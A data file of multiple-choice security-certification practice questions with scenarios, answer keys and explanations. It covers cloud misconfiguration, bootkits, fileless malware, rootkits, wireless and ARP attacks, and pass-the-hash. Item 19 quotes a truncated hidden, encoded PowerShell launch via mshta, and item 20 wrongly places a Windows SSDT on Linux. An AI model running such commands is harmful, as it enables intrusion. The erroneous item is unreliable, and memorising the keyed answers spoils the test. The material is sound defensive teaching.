    id: 15,
    portion: 3,
    subdomain: "2.3 Cloud-Specific Vulnerabilities & Misconfigurations",
    scenario: "A cybersecurity researcher discovers that a major telecommunications company has exposed over 6 million customer records (including national ID numbers, home addresses, and account PINs) on a public Amazon Web Services (AWS) Simple Storage Service (S3) cloud bucket. The cloud storage container was left set to AllUsers: Read (public read access) due to a junior engineer's configuration mistake during a migration script.",
    question: "Which security tool and architectural control should the organization implement to automatically detect and remediate such cloud misconfigurations across enterprise accounts?",
    options: [
      {
        text: "Cloud Security Posture Management (CSPM) enforcing automated organization-wide 'Block Public Access' policies",
        isCorrect: true,
        whyCorrect: "Cloud Security Posture Management (CSPM) continuously inspects cloud infrastructure environments (AWS, Azure, GCP) against security baselines, compliance standards, and CIS benchmarks. It automatically detects misconfigurations—such as open S3 buckets, unencrypted databases, and exposed management ports—and can execute automated remediation (e.g. instantly enabling AWS 'S3 Block Public Access' at the root organization level).",
        whyWrong: ""
      },
      {
        text: "Host-based Intrusion Detection System (HIDS) installed on hypervisor bare-metal",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "HIDS monitors file integrity and system logs on local OS instances, but cannot inspect serverless cloud object storage configuration APIs."
      },
      {
        text: "Hardware Security Module (HSM) generating symmetric session keys",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "An HSM manages cryptographic keys, but does not monitor cloud bucket access control permissions."
      },
      {
        text: "Domain Name System Security Extensions (DNSSEC) validation",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "DNSSEC prevents DNS spoofing by cryptographically signing zone records, unrelated to cloud storage bucket permission ACLs."
      }
    ],
    technicalRationale: "Cloud misconfigurations represent the leading cause of cloud data breaches. CSPM tools automate discovery of insecure API settings, identity entitlements, and publicly accessible storage containers.",
    kenyanMetaphor: "You build a state-of-the-art bank vault in Nairobi, but the apprentice forgetfully props open the back fire exit door with a wooden wedge so anyone walking down the street can stroll in and grab cash boxes. A CSPM is an automated robotic security inspector flying around the building 24/7 that immediately kicks the wedge away and locks the fire door the microsecond it is left ajar!"
  },

  // ==========================================
  // PORTION 4 (Q16 - Q20)
  // ==========================================
  {
    id: 16,
    portion: 4,
    subdomain: "2.3 Mobile Device Vulnerabilities / Platform Security",
    scenario: "A corporate enterprise enforces a Bring Your Own Device (BYOD) policy managed by a Mobile Device Management (MDM) solution. An employee modifies their corporate-enrolled smartphone by executing an exploit against the mobile operating system kernel to gain unrestricted superuser (root) privileges, override carrier restrictions, and install unauthorized third-party application stores. Shortly after, a sideloaded weather application steals confidential corporate email attachments and authentication tokens stored in the secure corporate container.",
    question: "Which mobile security compromise did the employee perform, and what core platform protection did it dismantle?",
    options: [
      {
        text: "Jailbreaking / Rooting; dismantled the operating system application sandbox boundaries and secure credential store isolation",
        isCorrect: true,
        whyCorrect: "Jailbreaking (iOS) and Rooting (Android) utilize privilege escalation exploits against the mobile kernel to grant the user superuser (UID 0 / root) access. This removes the fundamental mobile security mechanism: the Application Sandbox. In a normal mobile OS, each app is isolated in its own private directory and cannot read another app's memory or files. Once rooted/jailbroken, any sideloaded application can escape its sandbox, read corporate app data, log keystrokes, and bypass MDM security controls.",
        whyWrong: ""
      },
      {
        text: "SIM Swapping; dismantled the cellular carrier's Base Transceiver Station (BTS)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SIM swapping is a social engineering attack against a cellular carrier to transfer a victim's phone number to an attacker-controlled SIM card, not a local kernel modification."
      },
      {
        text: "Bluejacking; dismantled the Bluetooth Low Energy (BLE) pairing profile",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Bluejacking sends unsolicited text/image messages over Bluetooth, which does not grant root privileges or remove application sandboxes."
      },
      {
        text: "Over-The-Air (OTA) Carrier Update; dismantled the device's e-SIM profile",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "OTA carrier updates are official cellular firmware updates provided by telecommunications providers."
      }
    ],
    technicalRationale: "Mobile OS security relies on process sandboxing, code signing, and restricted root access. Rooting/jailbreaking circumvents these controls, exposing the device to inter-process data theft and MDM policy evasion.",
    kenyanMetaphor: "A high-security rental apartment in Kilimani where every tenant has their own locked private room (Application Sandbox). Rooting/jailbreaking is like taking a sledgehammer and knocking down all the interior walls so you can walk anywhere in the building. But now, any rogue stranger walking into the building can also walk right into your bedroom and open your wardrobe!"
  },

  {
    id: 17,
    portion: 4,
    subdomain: "2.3 Zero-Day Vulnerabilities & Firmware Exploits",
    scenario: "Security analysts investigate a high-security defense workstation infected by an unknown zero-day malware variant. The IT department completely wipes the Solid State Drive (SSD), formats all partitions, and reinstalls a fresh, clean Windows 11 enterprise image from a verified ISO. However, upon rebooting, the endpoint immediately re-establishes outbound command-and-control (C2) communication. Forensics reveals that the malware exploited a zero-day vulnerability (such as the BlackLotus bootkit) to bypass UEFI Secure Boot and install persistent malicious code directly inside the machine's motherboard UEFI NVRAM firmware before the operating system kernel initialized.",
    question: "What type of malicious persistence mechanism was deployed, and why did standard disk re-imaging fail to eliminate it?",
    options: [
      {
        text: "UEFI Bootkit; it executes in Ring -2 / pre-boot firmware before the OS kernel loads, persisting independently of physical hard drive partitions",
        isCorrect: true,
        whyCorrect: "A Bootkit is an advanced rootkit that infects the Master Boot Record (MBR), Volume Boot Record (VBR), or modern UEFI firmware. Operating at Ring -2 (pre-boot firmware level), it executes before the operating system kernel, hypervisor, or Endpoint Detection & Response (EDR) drivers are loaded into memory. Because the bootkit resides in the motherboard's SPI flash memory or EFI System Partition, wiping or replacing the operating system disk partition does not remove the infection.",
        whyWrong: ""
      },
      {
        text: "Memory Injection; it persists inside the CPU cache across complete power-off shutdowns",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "CPU cache and system RAM are volatile memory that lose all electrical charge and data milliseconds after power is removed; malware cannot persist in RAM across a full power cycle."
      },
      {
        text: "Cross-Site Scripting (XSS); it persists inside the local ISP router's MAC address table",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "XSS is a web application vulnerability, unrelated to motherboard firmware or pre-boot environments."
      },
      {
        text: "Logic Bomb; it is triggered by an out-of-band NTP time server broadcast",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "A logic bomb waits for a trigger condition, but if stored on the disk, re-imaging would have wiped it completely."
      }
    ],
    technicalRationale: "UEFI bootkits compromise the platform boot sequence below the OS kernel layer. Countermeasures include hardware roots of trust (TPM 2.0 measured boot), vendor firmware security updates, and Secure Boot revocation database (DBX) updates.",
    kenyanMetaphor: "A mechanic repairs a car by replacing the entire car body, engine, and tires with brand new parts. But the car still fails to start because a saboteur secretly changed the ignition software inside the master electronic engine control unit (ECU chip) hidden under the chassis! Wiping the seats and repainting the body does nothing to fix the chip."
  },

  {
    id: 18,
    portion: 4,
    subdomain: "2.4 Malware Types / Ransomware & Resilient Backups",
    scenario: "A healthcare hospital system is targeted by a sophisticated human-operated ransomware cartel. The adversaries dwell inside the network for three weeks, using living-off-the-land tools to locate and compromise the central Active Directory domain controller. Before encrypting 200 virtual machines with hybrid AES-256 and RSA-4096 cryptography, the attackers intentionally seek out the hospital's primary online Network Attached Storage (NAS) backup appliance, purge all shadow copies, and overwrite all network backup repositories with random zeros.",
    question: "Which backup architecture represents the ONLY definitive safeguard to guarantee rapid system recovery without paying the ransom demand?",
    options: [
      {
        text: "Immutable, Air-Gapped Backups stored on write-once-read-many (WORM) media or physically disconnected offline storage",
        isCorrect: true,
        whyCorrect: "Modern enterprise ransomware groups prioritize hunting and destroying accessible online backups before deploying encryption. The industry-standard 3-2-1 backup rule mandates an Air-Gapped / Immutable Copy: storage that is either physically disconnected from the network (offline tape, detached USB/NAS) or logically locked using Write-Once-Read-Many (WORM) cloud object locking policies where even a compromised domain admin account cannot delete or overwrite backups until a retention timer expires.",
        whyWrong: ""
      },
      {
        text: "Automated hourly continuous replication to an unsegmented local file share",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Replicating backups to an unsegmented local file share guarantees that the ransomware will encrypt the backups simultaneously."
      },
      {
        text: "Encrypting live production databases using Transparent Data Encryption (TDE)",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "TDE encrypts database files on disk at rest; ransomware simply encrypts the already-encrypted .mdf database files a second time."
      },
      {
        text: "Increasing the domain administrator password complexity to 32 characters",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "While good hygiene, longer passwords do not prevent attackers who steal credentials via Kerberoasting or pass-the-hash from wiping online backups."
      }
    ],
    technicalRationale: "Ransomware recovery resilience requires immutable backups with strict access control segregation and physical or logical air-gaps, ensuring attackers cannot destroy historical recovery checkpoints.",
    kenyanMetaphor: "Keeping your business ledger in the main shop. If robbers break in and set the shop on fire, keeping a photocopy in the desk drawer (online NAS) burns too. But if you take a photocopied ledger every Friday and lock it inside a steel underground fireproof safe at your family home in upcountry Nakuru (Air-Gapped), you can rebuild your business the next morning no matter what happens to the shop in Nairobi!"
  },

  {
    id: 19,
    portion: 4,
    subdomain: "2.4 Malware Types & Execution / In-Memory Attacks",
    scenario: "A financial services workstation triggers a network alert when an unexpected 1.5 GB outbound data transmission occurs at 02:00 AM. The security operations team runs a full disk scan using enterprise signature-based antivirus, which returns zero malware detections. However, inspecting active running processes reveals that a hidden PowerShell process was launched via mshta.exe using a heavily obfuscated command string: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA... The command directly loaded a reflective meterpreter beacon into the computer's volatile RAM memory without ever dropping or executing a .exe or .dll binary on the physical hard drive.",
    question: "Which category of malware did the threat actor deploy?",
    options: [
      {
        text: "Fileless Malware utilizing Living-off-the-Land Binaries (LotL)",
        isCorrect: true,
        whyCorrect: "Fileless Malware operates entirely in volatile system memory (RAM) and utilizes legitimate, pre-installed administrative operating system utilities—known as Living-off-the-Land Binaries (LotL) like PowerShell, WMI, BITSAdmin, or mshta.exe. Because no malicious binary file is written to the physical storage disk, traditional signature-based antivirus that inspects file systems on disk is completely blind. Detection requires Behavioral Endpoint Detection and Response (EDR) and script block logging.",
        whyWrong: ""
      },
      {
        text: "Macro Virus stored in a Microsoft Excel template",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "A macro virus is stored physically on disk inside an Office document file (.docm, .xlsm)."
      },
      {
        text: "Boot Sector MBR Virus",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "A boot sector virus writes malicious code to physical sector 0 (MBR) on the storage disk."
      },
      {
        text: "Self-Replicating Network Worm",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Worms are self-replicating programs that propagate autonomously across networks (like Conficker or WannaCry), but this scenario describes an in-memory LotL evasion technique."
      }
    ],
    technicalRationale: "Fileless malware leaves minimal disk footprints, bypassing file-system scanning. Defenders rely on Antimalware Scan Interface (AMSI), PowerShell Script Block Logging (Event ID 4104), and EDR behavioral memory inspection.",
    kenyanMetaphor: "A burglar breaking into your house. A traditional virus is like a burglar who brings their own crowbar, rope, and blowtorch and drops them on the living room carpet (files on disk). Fileless malware is a burglar who breaks in empty-handed, goes to your kitchen, uses your own cooking knives and chopping board to prepare food, eats everything, and wipes the counter clean—leaving no foreign tools behind!"
  },

  {
    id: 20,
    portion: 4,
    subdomain: "2.4 Malware Types & Evasion / Rootkit Architecture",
    scenario: "An administrator suspects a Linux database server is compromised. However, when the administrator executes ps aux, top, and netstat -antp, no suspicious processes or listening network ports are displayed. When the administrator mounts the server's hard drive as a secondary disk onto a clean, uncompromised forensic workstation, the forensic tool immediately discovers a malicious backdoor binary running on port 4444 and several hidden user accounts. Investigation reveals that the malware replaced kernel function pointers in the operating system's System Service Dispatch Table (SSDT).",
    question: "Which stealth malware mechanism was active on the running system, and how did it hide its presence?",
    options: [
      {
        text: "Kernel-Mode Rootkit; it intercepted and filtered operating system system calls (APIs) to hide its processes, files, and network sockets from user-space utilities",
        isCorrect: true,
        whyCorrect: "A Rootkit operates at Ring 0 (kernel level) with the highest privileges. By modifying kernel structures (such as the SSDT or through Direct Kernel Object Manipulation - DKOM), the rootkit intercepts system calls (e.g., sys_getdents or process enumeration APIs). When an administrator runs utilities like ps or netstat, the kernel rootkit intercepts the response and strips out any mention of its own files, processes, and network sockets, providing complete stealth to user-space tools.",
        whyWrong: ""
      },
      {
        text: "Keylogger; it redirected keyboard interrupt vectors to a cloud email server",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "A keylogger records keystrokes to steal passwords, but does not manipulate kernel process tables to hide listening ports from netstat."
      },
      {
        text: "Adware; it injected popup banners into web browser DOM objects",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Adware displays unsolicited advertisements, which is noisy and the exact opposite of kernel stealth."
      },
      {
        text: "Logic Bomb; it overwrote the kernel memory space upon reaching an expiration date",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "A logic bomb remains dormant until a trigger executes, whereas this rootkit was actively running and filtering system calls."
      }
    ],
    technicalRationale: "Kernel rootkits subvert OS integrity by modifying kernel structures or hooking system calls, lying to user-mode diagnostic utilities. Remediation typically mandates complete bare-metal re-imaging and firmware attestation.",
    kenyanMetaphor: "You hire an internal company auditor to inspect the attendance register. The supervisor on duty is corrupt and secretly erases his own name and his friends' names from the register before handing the paper to the auditor. When the auditor looks at the paper (user-space ps aux), it looks completely clean! But when you check the external CCTV cameras (offline forensic analysis), you see the corrupt supervisor sitting right there!"
  },

  // ==========================================
  // PORTION 5 (Q21 - Q25)
  // ==========================================
  {
    id: 21,
    portion: 5,
    subdomain: "2.1 Physical & Environmental Security / Facilities Sabotage",
    scenario: "During a targeted attack against a major regional data center, physical security perimeters remain unbreached. However, within 45 minutes, multiple core blade servers begin thermal throttling and initiate emergency hardware shutdowns due to CPU temperatures exceeding 95°C. Forensic examination reveals that an external attacker compromised the building's legacy IoT-connected Building Management System (BMS) through an unauthenticated Modbus TCP interface, remotely overriding the HVAC chillers to shut off primary cooling pumps and falsifying thermostat sensor telemetry to report normal ambient temperatures.",
    question: "Which type of physical/environmental attack occurred, and which mitigation would BEST isolate critical environmental controls from cyber intrusions?",
    options: [
      {
        text: "Environmental Sabotage via HVAC / BMS compromise; place the BMS on a physically isolated OT (Operational Technology) VLAN with strictly controlled jump hosts and unidirectional security gateways",
        isCorrect: true,
        whyCorrect: "Environmental attacks target heating, ventilation, and air conditioning (HVAC), power (UPS/generators), or fire suppression systems to induce hardware failures or outages. BMS and Industrial Control Systems (ICS/SCADA) frequently use unencrypted legacy protocols (e.g., Modbus, BACnet). CompTIA guidelines mandate isolating facility/BMS networks onto dedicated, segmented Operational Technology (OT) networks separated by firewalls, air-gaps, or unidirectional data diodes, preventing unauthorized external access.",
        whyWrong: ""
      },
      {
        text: "Tailgating attack; install mantrap portals at the data center server room doors",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Tailgating is an unauthorized individual physically following an authorized person through a door, which did not occur here since physical perimeters remained unbreached."
      },
      {
        text: "RFID Badge Cloning; upgrade all employee physical badges to 13.56 MHz smart cards",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "RFID badge cloning involves copying physical access badges, whereas this breach was conducted remotely over the network via IoT/BMS protocols."
      },
      {
        text: "Dumpster Diving; require cross-cut shredding for all discarded facility paper logs",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Dumpster diving targets discarded physical documents, not network-attached HVAC cooling controllers."
      }
    ],
    technicalRationale: "Operational Technology (OT) and Facility Control Systems require strict network segmentation (Purdue Model), multifactor authentication, and independent out-of-band environmental monitoring sensors to detect tampering.",
    kenyanMetaphor: "You run a large refrigerated milk storage warehouse in Eldoret with 10 heavy padlocks on the front gate. A rogue rival does not climb the fence; instead, they hack the digital thermostat on the cold room via an unprotected Wi-Fi link and switch off the coolers overnight. By morning, all 10,000 liters of milk are spoiled even though the front gate padlocks were never touched!"
  },

  {
    id: 22,
    portion: 5,
    subdomain: "2.5 Network Attacks / Distributed Denial of Service (DDoS) & Smokescreen Tactics",
    scenario: "A commercial banking platform experiences a sudden 400 Gbps volumetric Distributed Denial of Service (DDoS) attack utilizing DNS and NTP reflection amplification against its public web portal. While the Security Operations Center (SOC) is overwhelmed and actively troubleshooting the upstream ISP scrubbing center to mitigate the web outage, an unauthorized Wire transfer of $4.2 million is initiated from an internal SWIFT terminal using compromised administrator credentials.",
    question: "What strategic attack methodology was executed by the threat actors?",
    options: [
      {
        text: "A Smokescreen (Diversionary) DDoS attack designed to overwhelm the SOC and mask simultaneous high-value data exfiltration or fraudulent financial transactions",
        isCorrect: true,
        whyCorrect: "A Smokescreen (or diversionary) attack uses a loud, highly visible assault (such as a massive volumetric DDoS attack or noisy defacement) specifically to consume the security operations team's bandwidth, flood alerting pipelines, and distract defenders while the attackers quietly execute their primary high-value objective (e.g., wire fraud, credential harvesting, or database exfiltration).",
        whyWrong: ""
      },
      {
        text: "Evil Twin Wireless attack intended to intercept radio frequencies",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "An Evil Twin is a rogue wireless access point mimicking a legitimate SSID to intercept Wi-Fi traffic, not a multi-hundred Gbps volumetric WAN attack."
      },
      {
        text: "Bluejacking attack targeting Bluetooth mobile devices in the bank lobby",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Bluejacking sends unsolicited spam messages over short-range Bluetooth, completely unrelated to volumetric DNS/NTP floods or wire fraud."
      },
      {
        text: "ARP Spoofing attack on the public internet",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "ARP is a Layer 2 protocol that operates exclusively within a local broadcast domain (LAN), not across the public Internet."
      }
    ],
    technicalRationale: "Incident responders must maintain situational awareness during major availability outages. Never assume a DDoS attack is an isolated incident; automated correlation rules must continue monitoring privileged user activities and financial pipelines.",
    kenyanMetaphor: "Thieves want to rob a bank vault on Kenyatta Avenue in Nairobi. Instead of quietly picking the lock, they set a huge tire fire in the middle of the street outside and break the front display windows. While all the security guards and police rush to extinguish the fire and control the crowd (DDoS smokescreen), two burglars quietly slip in through the back alley door and loot the cash safe!"
  },

  {
    id: 23,
    portion: 5,
    subdomain: "2.5 Network & Infrastructure Attacks / DNS & Domain Hijacking",
    scenario: "Customers of a prominent retail e-commerce website report that when typing the store's exact, legitimate domain name (e.g., https://store.example.com), their browsers are directed to a fraudulent replica website hosted in another country that prompts them to re-enter their credit card numbers. The company's internal DNS servers and web servers are fully operational and uninfected. An emergency WHOIS query reveals that the authoritative Name Server (NS) records for the domain at the commercial Domain Registrar were modified without authorization at 03:00 AM.",
    question: "Which attack occurred, and which administrative registrar control would have PREVENTED this unauthorized change?",
    options: [
      {
        text: "Domain Hijacking; implementing Registrar Lock (clientTransferProhibited / clientUpdateProhibited) and Multi-Factor Authentication on the registrar account",
        isCorrect: true,
        whyCorrect: "Domain Hijacking occurs when an attacker gains unauthorized administrative access to the domain owner's registrar account (via credential theft, social engineering the registrar, or exploiting weak passwords) and alters the authoritative Name Server (NS) or MX records. Registrar Lock (represented by status codes like clientTransferProhibited, clientUpdateProhibited, and clientDeleteProhibited) prevents any modifications or transfers of domain records without rigorous multi-step identity verification.",
        whyWrong: ""
      },
      {
        text: "Cross-Site Scripting (XSS); implementing a strict Content Security Policy (CSP) header",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "XSS executes JavaScript in the victim's browser via vulnerable web application code; it does not alter domain registrar NS records."
      },
      {
        text: "SQL Injection; converting all web database queries to Parameterized Statements",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SQL Injection targets SQL database queries, not authoritative domain registration records at an external registrar."
      },
      {
        text: "MAC Spoofing; enabling 802.1X Port-Based Network Access Control",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "MAC spoofing alters Layer 2 physical hardware addresses on a local Ethernet switch, which has zero effect on global DNS routing."
      }
    ],
    technicalRationale: "Registrar-level security is critical. Organizations must enforce strict multi-factor authentication (MFA), Registry/Registrar locks, DNSSEC to validate authoritative record authenticity, and monitoring of WHOIS/DNS zone modifications.",
    kenyanMetaphor: "You own a valuable plot of land in Karen with an official title deed. While you are sleeping, a conman tricks the lands registry office clerk with fake IDs to transfer the title deed into the conman's name and redirect your rental income. A Registrar Lock is like placing an official caveat/court injunction on the title deed at the Ministry of Lands so that no transfer can EVER occur without you physically presenting your biometric national ID and passport in person!"
  },

  {
    id: 24,
    portion: 5,
    subdomain: "2.5 Wireless Attacks / 802.11 Deauthentication Floods & PMF",
    scenario: "A security analyst conducts a wireless penetration assessment in a corporate office. Using a wireless adapter in monitor mode, the analyst broadcasts spoofed 802.11 management frames containing Reason Code 7 (Class 3 frame received from nonassociated STA) to the broadcast MAC address FF:FF:FF:FF:FF:FF while spoofing the BSSID of the corporate WPA2-Enterprise Access Point. Immediately, all employee laptops and smartphones disconnect from the Wi-Fi network and attempt to reconnect, allowing the analyst to capture the 4-way WPA EAPOL handshakes.",
    question: "Which wireless attack was conducted, and which IEEE standard feature PREVENTS this vulnerability?",
    options: [
      {
        text: "802.11 Deauthentication Attack (Deauth Flood); enabling IEEE 802.11w Protected Management Frames (PMF) or upgrading to WPA3",
        isCorrect: true,
        whyCorrect: "In legacy 802.11 (including standard WPA2), management frames (such as Deauthentication, Disassociation, and Beacon frames) are transmitted unencrypted and unauthenticated. Attackers can easily spoof the Access Point's MAC address and send deauth frames to kick clients off the network (often to capture 4-way handshakes or force them onto an Evil Twin). IEEE 802.11w Protected Management Frames (PMF)—which is mandatory in WPA3—cryptographically signs and protects management frames, rendering deauth attacks ineffective.",
        whyWrong: ""
      },
      {
        text: "Evil Twin Attack; disabling SSID Broadcast in the wireless router settings",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Disabling SSID broadcast does not encrypt management frames; attackers can still discover hidden SSIDs and send deauth packets."
      },
      {
        text: "WPS PIN Brute Force Attack; disabling WPS (Wi-Fi Protected Setup) on the access point",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "WPS attacks target the 8-digit PIN on consumer routers (Pixie Dust attack), not 802.11 deauth frame flooding."
      },
      {
        text: "Bluebugging; disabling Bluetooth discovery on all client endpoints",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Bluebugging exploits Bluetooth vulnerabilities to take control of a phone, unrelated to 802.11 Wi-Fi management frames."
      }
    ],
    technicalRationale: "IEEE 802.11w introduces cryptographic protection (AES-128-CMAC) for unicast and broadcast management frames. WPA3 mandates PMF (Protected Management Frames), eliminating legacy deauth denial-of-service and handshake sniffing vectors.",
    kenyanMetaphor: "You are seated inside a matatu (minibus) talking to the driver. A rogue prankster standing on the roadside shouts loudly through the open window: 'Hey everyone, the driver says this matatu is broken, everybody get out right now!' (unprotected deauth frame). Everyone panics and steps out onto the pavement. Protected Management Frames (PMF) is like the driver using an encrypted two-way intercom with a secret password so passengers only listen to verified announcements from the actual driver!"
  },

  {
    id: 25,
    portion: 5,
    subdomain: "2.5 Layer 2 Network Attacks / ARP Poisoning & Dynamic ARP Inspection",
    scenario: "An attacker connects a rogue laptop to an unmanaged Ethernet port on the corporate internal LAN. The attacker launches the tool arpspoof and continuously transmits gratuitous ARP replies asserting that the IP address of the default gateway (192.168.1.1) is mapped to the MAC address of the attacker's laptop (00:11:22:33:44:55). Concurrently, the attacker informs the default gateway that all workstation IP addresses map to the attacker's MAC. Consequently, all outbound and inbound LAN traffic flows through the attacker's machine for packet sniffing and SSL stripping.",
    question: "Which Layer 2 attack was executed, and which switch security features MUST be implemented together to neutralize this threat?",
    options: [
      {
        text: "ARP Poisoning (ARP Spoofing / On-Path Attack); implement Dynamic ARP Inspection (DAI) coupled with DHCP Snooping on the access switches",
        isCorrect: true,
        whyCorrect: "ARP is inherently stateless and unauthenticated; devices blindly update their local ARP cache tables upon receiving gratuitous ARP replies. ARP Poisoning allows an attacker to position themselves as an On-Path (Man-in-the-Middle) attacker. Dynamic ARP Inspection (DAI) inspects all ARP requests and responses on untrusted switch ports and validates them against the DHCP Snooping Binding Database (IP-to-MAC-to-Port mappings), dropping any invalid or spoofed ARP packets.",
        whyWrong: ""
      },
      {
        text: "MAC Flooding; configure BPDU Guard on all switch trunk interfaces",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "MAC flooding overflows switch CAM tables with fake MACs to force hub behavior; BPDU Guard protects against unauthorized Spanning Tree bridges, not ARP spoofing."
      },
      {
        text: "VLAN Hopping via Double Tagging; disable Spanning Tree Protocol (STP) on access ports",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "VLAN hopping exploits 802.1Q double encapsulation on native VLAN trunks, not Layer 2 ARP resolution."
      },
      {
        text: "DNS Cache Poisoning; configure DNSSEC on the root domain zone",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "DNS Cache Poisoning corrupts DNS resolver records (Layer 7/IP), whereas ARP poisoning corrupts Layer 2 address resolution on the local broadcast domain."
      }
    ],
    technicalRationale: "Dynamic ARP Inspection (DAI) intercepts and validates ARP packets on untrusted switch ports by cross-referencing the DHCP Snooping binding table. Invalid bindings are discarded, preventing ARP cache poisoning.",
  },

  // ==========================================
  // PORTION 6 (Q26 - Q30)
  // ==========================================
  {
    id: 26,
    portion: 6,
    subdomain: "2.4 Identity & Authentication Attacks / Lateral Movement (Pass the Hash & Replay)",
    scenario: "A penetration tester compromises a low-privilege domain workstation. Using an open-source tool, the tester extracts the Local Security Authority Subsystem Service (LSASS) memory dump and obtains an NTLM password hash (AAD3B435B51404EE...) belonging to the Domain Enterprise Administrator. Without cracking the plaintext password, the tester executes remote administrative commands on the primary Domain Controller by passing the raw NTLM hash directly to the SMB/RPC interface.",
    question: "Which credential theft and lateral movement attack was executed, and which security feature in modern Windows environments isolates LSASS to PREVENT memory scraping?",
    options: [
      {
        text: "Pass-the-Hash (PtH); enable Windows Defender Credential Guard using Virtualization-Based Security (VBS)",
        isCorrect: true,
        whyCorrect: "Pass-the-Hash (PtH) allows an attacker to authenticate to remote servers using the underlying NTLM password hash without needing the cleartext password. Windows Defender Credential Guard uses Hyper-V Virtualization-Based Security (VBS) to isolate the LsaIso.exe (Isolated LSA) process in a protected virtual container, preventing attackers—even those with local SYSTEM or debug privileges—from reading or scraping credentials and hashes from LSASS memory.",
        whyWrong: ""
      },
      {
        text: "Pass-the-Ticket (PtT); install a Web Application Firewall (WAF) on the perimeter",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "PtT steals Kerberos TGT tickets, not NTLM hashes, and WAFs protect web servers, not local LSASS memory."
      },
      {
        text: "Brute Force Dictionary Attack; enforce a 15-character minimum password length",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Brute force password cracking is irrelevant here because the attacker never attempted to reverse or crack the plaintext password."
      },
      {
        text: "Evil Twin Attack; enable 802.1X EAP-TLS authentication on all access points",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "Evil Twin is a rogue wireless AP spoofing attack, completely unrelated to Windows OS credential extraction."
      }
    ],
    technicalRationale: "Pass-the-Hash exploits the NTLM authentication mechanism by submitting harvested password hashes directly. Virtualization-Based Security (VBS) and Credential Guard isolate secrets within a secure micro-hypervisor container.",
    kenyanMetaphor: "A hotel room uses magnetic keycards instead of physical keys. The burglar does not know the master code or the key's internal PIN, but they grab the magnetic keycard itself off the supervisor's desk and tap the door reader directly (Pass-the-Hash). Credential Guard is like keeping the master keycards locked inside an impenetrable biometric safe in a separate bunker room so no one walking into the reception lobby can ever touch them!"
  },

  {
    id: 27,
    portion: 6,
    subdomain: "2.4 Malicious Code & Legacy Protocol Vulnerabilities (WannaCry & Lateral Worms)",
    scenario: "An unpatched Windows Server 2008 R2 machine connected to an internal network is infected with a self-propagating worm. Within minutes, the malware exploits a known memory corruption vulnerability in the legacy Server Message Block version 1 (SMBv1) protocol (MS17-010 / EternalBlue), rapidly executing arbitrary code across all connected subnets and encrypting all shared network files without requiring any user interaction or phishing clicks.",
    question: "What type of vulnerability was exploited, and which immediate hardening step MUST the security engineer enforce across the enterprise to prevent similar lateral propagation?",
    options: [
      {
        text: "Legacy Protocol Remote Code Execution (RCE); completely disable SMBv1 via Group Policy and restrict SMB port 445 at internal firewalls",
        isCorrect: true,
        whyCorrect: "Legacy protocols like SMBv1 (developed over 30 years ago) lack modern security controls and contain critical memory-safety flaws (such as MS17-010 EternalBlue exploited by WannaCry and NotPetya). CompTIA hardening guidelines mandate completely disabling SMBv1 enterprise-wide via Group Policy Object (GPO) or PowerShell, enforcing SMBv2/SMBv3 with signing/encryption, and blocking TCP port 445 at boundary firewalls.",
        whyWrong: ""
      },
      {
        text: "Cross-Site Scripting (XSS); deploy a Content Security Policy header on web servers",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "XSS is a web browser script injection flaw, not a kernel/network protocol buffer corruption."
      },
      {
        text: "SQL Injection; rewrite all database queries using Parameterized Prepared Statements",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "SQL Injection targets SQL database queries, not SMB file-sharing services."
      },
      {
        text: "DNS Amplification; configure Response Rate Limiting (RRL) on external name servers",
        isCorrect: false,
        whyCorrect: "",
        whyWrong: "DNS amplification is a UDP volumetric DDoS attack, unrelated to internal worm propagation over SMB."
      }
    ],
    technicalRationale: "Unauthenticated remote code execution flaws in legacy network services allow autonomous worm propagation. Hardening mandates disabling outdated, insecure protocols (SMBv1, SSL 3.0, TLS 1.0/1.1, Telnet).",
    kenyanMetaphor: "An old estate in Nairobi has modern steel gates on all houses, but the perimeter fence still has an old, broken wooden pedestrian turnstile from 1970 that has no lock (legacy SMBv1). A pack of hyenas slips through the broken turnstile and attacks every house in the compound. The immediate fix is to weld the old wooden gate shut permanently and remove it (disable SMBv1)!"
  },

  {
    id: 28,
    portion: 6,
    subdomain: "2.3 Web Application Attacks / Cross-Site Request Forgery (CSRF/XSRF)",
